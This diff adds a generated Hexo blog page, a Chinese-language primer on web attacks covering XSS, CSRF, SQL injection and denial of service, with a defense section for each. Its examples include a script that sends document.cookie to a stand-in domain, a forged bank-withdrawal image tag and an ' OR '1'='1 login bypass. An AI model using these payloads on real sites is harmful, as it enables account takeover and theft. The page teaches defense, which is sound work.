@@ -1,0 +1,590 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>跨站脚本攻击 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-03-23 15:13" pubdate>
+        March 23, 2020 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      22
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">跨站脚本攻击</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <!-- GFM-TOC -->
+
+<ul>
+<li><a href="#%E4%B8%80%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB">一、跨站脚本攻击</a></li>
+<li><a href="#%E4%BA%8C%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">二、跨站请求伪造</a></li>
+<li><a href="#%E4%B8%89sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">三、SQL 注入攻击</a></li>
+<li><a href="#%E5%9B%9B%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">四、拒绝服务攻击</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a><!-- GFM-TOC -->
+
+</li>
+</ul>
+<h1 id="一、跨站脚本攻击"><a href="#一、跨站脚本攻击" class="headerlink" title="一、跨站脚本攻击"></a>一、跨站脚本攻击</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p>
+<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;//domain.com/?c=&quot;</span> + <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<p>之后该内容可能会被渲染成以下形式：</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;//domain.com/?c=&quot;</span> + <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre>
+
+<p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul>
+<li>窃取用户的 Cookie</li>
+<li>伪造虚假的输入表单骗取个人信息</li>
+<li>显示伪造的文章或者图片</li>
+</ul>
+<h2 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-设置-Cookie-为-HttpOnly"><a href="#1-设置-Cookie-为-HttpOnly" class="headerlink" title="1. 设置 Cookie 为 HttpOnly"></a>1. 设置 Cookie 为 HttpOnly</h3><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p>
+<h3 id="2-过滤特殊字符"><a href="#2-过滤特殊字符" class="headerlink" title="2. 过滤特殊字符"></a>2. 过滤特殊字符</h3><p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p>
+<p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p>
+<p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p>
+<p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;q&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span>
+<span class="javascript">alert(<span class="hljs-regexp">/xss/</span>);</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+
+<span class="hljs-symbol">&amp;lt;</span>form<span class="hljs-symbol">&amp;gt;</span>
+  <span class="hljs-symbol">&amp;lt;</span>input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;<span class="hljs-symbol">&amp;gt;</span>
+<span class="hljs-symbol">&amp;lt;</span>/form<span class="hljs-symbol">&amp;gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span>
+
+<span class="hljs-symbol">&amp;lt;</span>script type=&quot;text/javascript&quot;<span class="hljs-symbol">&amp;gt;</span>
+alert(/xss/);
+<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span></code></pre>
+
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://jsxss.com/zh/try.html">XSS 过滤在线测试</a></p>
+</blockquote>
+<h1 id="二、跨站请求伪造"><a href="#二、跨站请求伪造" class="headerlink" title="二、跨站请求伪造"></a>二、跨站请求伪造</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p>
+<p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p>
+<h2 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>假如一家银行用以执行转账操作的 URL 地址如下：</p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.examplebank.com/withdraw?account=AccoutName&amp;amount=<span class="hljs-number">1000</span>&amp;<span class="hljs-keyword">for</span>=PayeeName。</code></pre>
+
+<p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p>
+<pre><code class="hljs dts"><span class="hljs-params">&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice<span class="hljs-variable">&amp;amount</span>=<span class="hljs-number">1000</span><span class="hljs-variable">&amp;for</span>=Badman&quot;&gt;</span>。</code></pre>
+
+<p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p>
+<p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
+<p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
+<h2 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-检查-Referer-首部字段"><a href="#1-检查-Referer-首部字段" class="headerlink" title="1. 检查 Referer 首部字段"></a>1. 检查 Referer 首部字段</h3><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p>
+<p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p>
+<h3 id="2-添加校验-Token"><a href="#2-添加校验-Token" class="headerlink" title="2. 添加校验 Token"></a>2. 添加校验 Token</h3><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p>
+<h3 id="3-输入验证码"><a href="#3-输入验证码" class="headerlink" title="3. 输入验证码"></a>3. 输入验证码</h3><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p>
+<h1 id="三、SQL-注入攻击"><a href="#三、SQL-注入攻击" class="headerlink" title="三、SQL 注入攻击"></a>三、SQL 注入攻击</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p>
+<h2 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如一个网站登录验证的 SQL 查询代码为：</p>
+<pre><code class="hljs sql">strSQL = &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> (<span class="hljs-keyword">name</span> = <span class="hljs-string">&#x27;&quot; + userName + &quot;&#x27;</span>) <span class="hljs-keyword">and</span> (pw = <span class="hljs-string">&#x27;&quot;+ passWord +&quot;&#x27;</span>);&quot;</code></pre>
+
+<p>如果填入以下内容：</p>
+<pre><code class="hljs sql">userName = &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;
+passWord = &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;</code></pre>
+
+<p>那么 SQL 查询字符串为：</p>
+<pre><code class="hljs sql">strSQL = &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> (<span class="hljs-keyword">name</span> = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-keyword">and</span> (pw = <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>);&quot;</code></pre>
+
+<p>此时无需验证通过就能执行以下查询：</p>
+<pre><code class="hljs sql">strSQL = &quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span>;&quot;</code></pre>
+
+<h2 id="防范手段-2"><a href="#防范手段-2" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-使用参数化查询"><a href="#1-使用参数化查询" class="headerlink" title="1. 使用参数化查询"></a>1. 使用参数化查询</h3><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p>
+<pre><code class="hljs java">PreparedStatement stmt = connection.prepareStatement(<span class="hljs-string">&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;</span>);
+stmt.setString(<span class="hljs-number">1</span>, userid);
+stmt.setString(<span class="hljs-number">2</span>, password);
+ResultSet rs = stmt.executeQuery();</code></pre>
+
+<h3 id="2-单引号转换"><a href="#2-单引号转换" class="headerlink" title="2. 单引号转换"></a>2. 单引号转换</h3><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p>
+<h1 id="四、拒绝服务攻击"><a href="#四、拒绝服务攻击" class="headerlink" title="四、拒绝服务攻击"></a>四、拒绝服务攻击</h1><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
+<p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">维基百科：跨站脚本</a></li>
+<li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A">维基百科：SQL 注入攻击</a></li>
+<li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">维基百科：跨站点请求伪造</a></li>
+<li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A">维基百科：拒绝服务攻击</a></li>
+</ul>
+<div align="center"><img width="320px" src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/githubio/公众号二维码-2.png" srcset="/img/loading.gif"></img></div>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/04/11/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-Redis%E6%B7%B1%E5%BA%A6%E5%8E%86%E9%99%A9/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">读书笔记-Redis深度历险</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/23/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/">
+                        <span class="hidden-mobile">搭建hexo博客</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "跨站脚本攻击&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
